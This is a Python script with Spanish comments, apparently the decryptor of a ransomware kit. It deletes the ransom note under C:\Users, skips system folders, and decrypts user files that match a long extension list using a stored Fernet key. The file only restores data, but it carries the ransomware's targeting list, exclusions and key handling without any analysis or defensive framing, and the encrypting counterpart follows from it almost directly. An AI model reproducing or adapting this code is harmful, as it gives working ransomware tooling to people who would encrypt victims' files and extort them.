from cryptography.fernet import Fernet
import os

EXCLUIR_CARPETAS = [
    'Program Files',
    'Program Files (x86)',
    'Windows',
    '$Recycle.Bin',
    'AppData',
    'logs',
    'C:\\Users\\rafa\\Desktop\\scripts'  # Carpeta adicional a excluir
]

EXTENSIONES_PERMITIDAS = [
    '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw',  # imágenes
    '.mp3', '.mp4', '.m4a', '.aac', '.ogg', '.flac', '.wav', '.wma', '.aiff', '.ape',  # música y sonido
    '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp',  # vídeos y películas
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',  # Microsoft Office
    '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt',  # OpenOffice, Adobe, LaTeX, Markdown, etc.
    '.yml', '.yaml', '.json', '.xml', '.csv',  # datos estructurados
    '.db', '.sql', '.dbf', '.mdb', '.iso',  # bases de datos e imágenes de disco
    '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css',  # tecnologías web
    '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx',  # código fuente en C
    '.java', '.class', '.jar',  # código fuente en Java
    '.ps', '.bat', '.vb', '.vbs',  # scripts para Windows
    '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift',  # scripts para Linux/Mac
    '.go', '.py', '.pyc', '.bf', '.coffee',  # otros archivos de código fuente
    '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak'  # formatos comprimidos
]

def cargar_llave():
    return open("key.key", "rb").read()

def desencriptar(items, key):
    fernet = Fernet(key)
    for item in items:
        if not os.path.splitext(item)[1].lower() in EXTENSIONES_PERMITIDAS:
            continue
        try:
            with open(item, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            with open(item, "wb") as file:
                file.write(decrypted_data)
        except PermissionError:
            print(f"No se pudo acceder al archivo: {item}")
        except Exception as e:
            print(f"Error al desencriptar el archivo {item}: {e}")

def obtener_archivos_en_directorio(path):
    archivos = []
    for root, _, files in os.walk(path):
        if any(excluir in root for excluir in EXCLUIR_CARPETAS):
            continue
        for file in files:
            if os.path.splitext(file)[1].lower() in EXTENSIONES_PERMITIDAS:
                archivos.append(os.path.join(root, file))
    return archivos

if __name__ == "__main__":
    # Directorio que se va a desencriptar
    path_to_decrypt = "C:\\Users"

    # Eliminar la nota de rescate
    readme_path = os.path.join(path_to_decrypt, "readme.txt")
    if os.path.exists(readme_path):
        os.remove(readme_path)

    # Obtener todos los archivos en el directorio y subdirectorios
    items = obtener_archivos_en_directorio(path_to_decrypt)

    # Cargar la llave
    key = cargar_llave()

    # Desencriptar los archivos
    desencriptar(items, key)
